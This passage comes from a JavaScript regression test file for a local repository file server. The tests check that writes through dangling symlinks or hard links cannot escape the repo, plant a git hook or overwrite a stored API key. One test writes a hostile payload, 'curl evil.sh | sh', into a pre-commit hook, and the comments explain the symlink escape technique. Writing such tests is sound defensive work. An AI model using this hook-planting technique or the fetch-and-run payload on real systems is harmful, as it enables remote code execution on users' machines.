    const ok = await fetch(`${base}/api/file?path=${encodeURIComponent('.sequence/decisions/real.md')}`);
    assert.strictEqual(ok.status, 200);
    assert.match(await ok.text(), /real record/);
    const key = await fetch(`${base}/api/file?path=${encodeURIComponent('.sequence/ai.json')}`);
    assert.strictEqual(key.status, 403, 'the key stays refused');
    assert.ok(!(await key.text()).includes(SECRET));
  } finally {
    await close();
  }
});

test('a DANGLING symlink cannot be used to write outside the repo (jail escape)', async () => {
  // Adversarial round 2, F1 — verified RCE. `realpathSync` throws on a dangling
  // symlink, so the resolver treated the leaf as "not there yet" and fell back to
  // the LEXICAL path — while writeFileSync happily followed the link. Git stores
  // symlinks, so a hostile repo carries the payload through a clone.
  const repo = freshRepo();
  const outside = path.join(path.dirname(repo), 'outside-victim.txt');
  fs.rmSync(outside, { force: true });
  try {
    fs.symlinkSync(outside, path.join(repo, 'notes.md')); // target does NOT exist
  } catch {
    return; // symlinks not permitted here; skip
  }
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(`${base}/api/file`, {
      method: 'PUT',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ path: 'notes.md', content: 'ESCAPED-THE-JAIL' }),
    });
    assert.strictEqual(res.status, 403, 'a write through a dangling symlink must be refused');
    assert.ok(!fs.existsSync(outside), 'nothing may be written outside the repo');
  } finally {
    await close();
    fs.rmSync(outside, { force: true });
  }
});

test('a DANGLING symlink into .git cannot be used to plant a hook (RCE)', async () => {
  // The same escape aimed at code execution: `.git/hooks/pre-commit` does not
  // exist in a fresh clone, so a committed symlink to it is dangling by default.
  const repo = freshRepo();
  fs.mkdirSync(path.join(repo, '.git', 'hooks'), { recursive: true });
  const hook = path.join(repo, '.git', 'hooks', 'pre-commit');
  fs.rmSync(hook, { force: true });
  try {
    fs.symlinkSync(hook, path.join(repo, 'harmless.md'));
  } catch {
    return;
  }
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(`${base}/api/file`, {
      method: 'PUT',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ path: 'harmless.md', content: '#!/bin/sh\ncurl evil.sh | sh\n' }),
    });
    assert.strictEqual(res.status, 403, 'a write canonicalising into .git must be refused');
    assert.ok(!fs.existsSync(hook), 'no git hook may be planted');
  } finally {
    await close();
  }
});

test('a HARD link inside .sequence/decisions cannot be used to CLOBBER the API key', async () => {
  // Adversarial round 2, F2 — verified. The read side refused a hardlinked
  // record; the write side never stat'd at all, so "Open in editor" overwrote
  // the user's stored key with markdown.
  const repo = freshRepo();
  const SECRET = 'sk-ant-WRITE-SIDE-MUST-REFUSE-5150';
  fs.mkdirSync(path.join(repo, '.sequence', 'decisions'), { recursive: true });
  const keyFile = path.join(repo, '.sequence', 'ai.json');
  fs.writeFileSync(keyFile, JSON.stringify({ provider: 'anthropic', model: 'x', apiKey: SECRET }));
  try {
    fs.linkSync(keyFile, path.join(repo, '.sequence', 'decisions', 'leak.md'));
  } catch {
    return; // hard links not permitted here; skip
  }
  const { base, close } = await startRepoServer(repo);
  try {
    const res = await fetch(`${base}/api/file`, {
      method: 'PUT',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ path: '.sequence/decisions/leak.md', content: '# clobbered' }),
    });
    assert.strictEqual(res.status, 403, 'writing through a hard link must be refused');
    assert.ok(
      fs.readFileSync(keyFile, 'utf8').includes(SECRET),
      'the stored API key must survive'
    );
  } finally {
    await close();
  }
});
